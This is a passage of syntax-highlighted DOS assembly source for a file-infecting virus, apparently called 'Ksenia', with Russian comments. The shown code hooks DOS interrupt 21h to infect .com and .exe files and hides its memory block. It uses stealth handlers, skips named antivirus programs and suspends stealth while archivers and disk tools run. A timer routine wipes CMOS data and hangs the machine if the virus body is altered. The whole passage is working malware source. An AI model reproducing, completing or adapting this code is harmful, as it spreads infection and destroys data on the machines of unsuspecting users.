        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">

 </span><span class="sc5">escan</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; сканним пока не найдем DW 0</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; за ним следует имя файла (программы),</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">escan</span><span class="sc0">           </span><span class="sc1">; из которой был запушен вирус</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; dx -&gt; имя</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">           </span><span class="sc1">; проинициализируем стековые указатели</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; а то они болтаются где-то внизу //</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc5">stacks</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">stacks</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">        </span><span class="sc1">; запускаем носителя</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">epb</span><span class="sc0">          </span><span class="sc1">; ES:BX = EPB</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; получение сегмента окружения</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">          </span><span class="sc1">; освобождение блока памяти</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">           </span><span class="sc1">; маскируем наш блок памяти так, как будто</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; он содержит только наш PSP. А под себя</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; построим другой блок памяти, следующий</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">; прямо за PSP. При завершении программы</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc0">          </span><span class="sc1">; наш блок памяти не будет освобожен.</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">0fh</span><span class="sc0">    </span><span class="sc1">; Память под MCB нам любезно предоставлена</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; командной строкой (PSP+0F0h)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">101h</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">103h</span><span class="sc4">],</span><span class="sc5">msize</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc0">          </span><span class="sc1">; AH=4Dh (WAIT)</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; получить ErrorLevel запущенной программы</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">          </span><span class="sc1">; AH=4Ch (EXIT)</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; выйти в DOS без всяких подозрений</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Область данных</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒

 </span><span class="sc5">copyright</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Ksenia.'</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">vsize</span><span class="sc4">/</span><span class="sc2">1000</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">vsize</span><span class="sc4">/</span><span class="sc2">100</span><span class="sc0">  </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">vsize</span><span class="sc4">/</span><span class="sc2">10</span><span class="sc0">   </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">vsize</span><span class="sc0">      </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' Version 1.0 Copyright (C) by Deadman'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">v_id</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'[KSENIA/Deadman]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">ssize</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">v_id</span><span class="sc0">

 </span><span class="sc5">extens</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; расширения файлов, которые мы</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; инфицируем</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">prms</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'DRWEB'</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">' /NM'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'F-PROT'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">' /NOMEM'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'AVP'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">' /M'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">AVs</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'AVP'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; их вирус трогать не будет</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'DrWeb'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Web'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'F-Prot'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'TB'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ADInf'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Clean'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Scan'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'NOD'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'VSafe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Anti'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'NAV'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FV'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindViru'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Command'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">windir</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WINBOOTDIR='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">comspec</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'COMMAND'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">fixes</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'\SYSTEM\CONAGENT.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'\COMMAND\MODE.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">stlock</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'PkZip'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; программы, во время работы которых</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'RAR'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; отключаются стелс-функции вируса</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ARJ'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'LHA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ARC'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ZOO'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'DEFRAG'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SPEEDISK'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ChkDsk'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'BACKUP'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MSBACKUP'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ScanDisk'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'NDD'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">funcs</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1856h</span><span class="sc4">,</span><span class="sc5">tsrtest</span><span class="sc0">     </span><span class="sc1">; проверка зараженности памяти (NULL)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">4AFFh</span><span class="sc4">,</span><span class="sc5">rehook</span><span class="sc0">      </span><span class="sc1">; re-перехват вектора (SETBLOCK)</span><span class="sc0">

              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">3DFFh</span><span class="sc4">,</span><span class="sc5">infect</span><span class="sc0">      </span><span class="sc1">; заражение (OPEN)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1857h</span><span class="sc4">,</span><span class="sc5">infect</span><span class="sc0">      </span><span class="sc1">; заражение (VIXFIRUS)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">41FFh</span><span class="sc4">,</span><span class="sc5">infect</span><span class="sc0">      </span><span class="sc1">; заражение (DEL)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">43FFh</span><span class="sc4">,</span><span class="sc5">infect</span><span class="sc0">      </span><span class="sc1">; заражение (CHMOD)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">4BFFh</span><span class="sc4">,</span><span class="sc5">infect</span><span class="sc0">      </span><span class="sc1">; заражение (EXEC)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">56FFh</span><span class="sc4">,</span><span class="sc5">infect</span><span class="sc0">      </span><span class="sc1">; заражение (REN)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">6C00h</span><span class="sc4">,</span><span class="sc5">extinfect</span><span class="sc0">   </span><span class="sc1">; заражение (EXTOPEN)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">7141h</span><span class="sc4">,</span><span class="sc5">lfninfect</span><span class="sc0">   </span><span class="sc1">; заражение (LFN DEL)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">7143h</span><span class="sc4">,</span><span class="sc5">lfninfect</span><span class="sc0">   </span><span class="sc1">; заражение (LFN CHMOD)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">7156h</span><span class="sc4">,</span><span class="sc5">lfninfect</span><span class="sc0">   </span><span class="sc1">; заражение (LFN REN)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">716Ch</span><span class="sc4">,</span><span class="sc5">extlfninf</span><span class="sc0">   </span><span class="sc1">; заражение (LFN OPEN)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">71A9h</span><span class="sc4">,</span><span class="sc5">extlfninf</span><span class="sc0">   </span><span class="sc1">; заражение (LFN SERVER OPEN)</span><span class="sc0">

              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">11FFh</span><span class="sc4">,</span><span class="sc5">fcbstealth</span><span class="sc0">  </span><span class="sc1">; стелс (FCB)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">12FFh</span><span class="sc4">,</span><span class="sc5">fcbstealth</span><span class="sc0">  </span><span class="sc1">; стелс (FCB)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">4EFFh</span><span class="sc4">,</span><span class="sc5">dtastealth</span><span class="sc0">  </span><span class="sc1">; стелс (DTA)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">4FFFh</span><span class="sc4">,</span><span class="sc5">dtastealth</span><span class="sc0">  </span><span class="sc1">; стелс (DTA)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">714Eh</span><span class="sc4">,</span><span class="sc5">lfnstealth</span><span class="sc0">  </span><span class="sc1">; стелс (LFN)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">714Fh</span><span class="sc4">,</span><span class="sc5">lfnstealth</span><span class="sc0">  </span><span class="sc1">; стелс (LFN)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">71A6h</span><span class="sc4">,</span><span class="sc5">infstealth</span><span class="sc0">  </span><span class="sc1">; стелс (LFN HANDLE INFO)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">5700h</span><span class="sc4">,</span><span class="sc5">date_get</span><span class="sc0">    </span><span class="sc1">; стелс (GET DATE)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">5701h</span><span class="sc4">,</span><span class="sc5">date_set</span><span class="sc0">    </span><span class="sc1">; стелс (SET DATE)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">42FFh</span><span class="sc4">,</span><span class="sc5">seekstealth</span><span class="sc0"> </span><span class="sc1">; стелс (LSEEK)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">3FFFh</span><span class="sc4">,</span><span class="sc5">readstealth</span><span class="sc0"> </span><span class="sc1">; стелс (READ)</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">40FFh</span><span class="sc4">,</span><span class="sc5">diswrite</span><span class="sc0">    </span><span class="sc1">; стелс (WRITE)</span><span class="sc0">

              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">3EFFh</span><span class="sc4">,</span><span class="sc5">patchsft</span><span class="sc0">    </span><span class="sc1">; корректировка SFT</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">44FFh</span><span class="sc4">,</span><span class="sc5">patchsft</span><span class="sc0">    </span><span class="sc1">; корректировка SFT</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">45FFh</span><span class="sc4">,</span><span class="sc5">patchsft</span><span class="sc0">    </span><span class="sc1">; корректировка SFT</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">46FFh</span><span class="sc4">,</span><span class="sc5">patchsft</span><span class="sc0">    </span><span class="sc1">; корректировка SFT</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">68FFh</span><span class="sc4">,</span><span class="sc5">patchsft</span><span class="sc0">    </span><span class="sc1">; корректировка SFT</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Обработчик прерывания 08 (Virus Guard)</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">vguard</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">delay</span><span class="sc0">        </span><span class="sc1">; проверка будет происходить примерно</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">delay</span><span class="sc4">,</span><span class="sc2">18</span><span class="sc0">     </span><span class="sc1">; каждую секунду</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">exit_guard</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">delay</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crc</span><span class="sc0">             </span><span class="sc1">; подсчет CRC теля вируса</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">checksum</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; сравнение ее с эталонной</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">crc_ok</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">         </span><span class="sc1">; запрещение всех прерываний</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; затираем данные CMOS</span><span class="sc0">
 </span><span class="sc5">cmos</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cmos</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">

 </span><span class="sc5">crc_ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1856h</span><span class="sc0">        </span><span class="sc1">; проверяем, никто ли не выкидывал наш</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; обработчик 21-го прерывания из общей</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3265h</span><span class="sc0">        </span><span class="sc1">; цепи?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_guard</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">        </span><span class="sc1">; запрос вектора int 21h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_dup</span><span class="sc0">         </span><span class="sc1">; установить 21-й вектор прерывания на другой</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">manager</span><span class="sc0">      </span><span class="sc1">; здесь нужно переустановить вектор</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">chk_dup</span><span class="sc0">         </span><span class="sc1">; находим место, куда указывал вектор</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">reset</span><span class="sc0">           </span><span class="sc1">; в последние годы своей жизни</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">handler</span><span class="sc0">
 </span><span class="sc5">reset</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">        </span><span class="sc1">; переустанавливаем вектор</span><span class="sc0">
        </span><span class="sc5">mvs</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

 </span><span class="sc5">exit_guard</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">d</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">io08</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Обработчик прерывания 21</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">handler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">chk_dup</span><span class="sc0">         </span><span class="sc1">; проверка, не переустановили ли вектор</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">manager</span><span class="sc0">         </span><span class="sc1">; это бывает после загрузки Win95</span><span class="sc0">
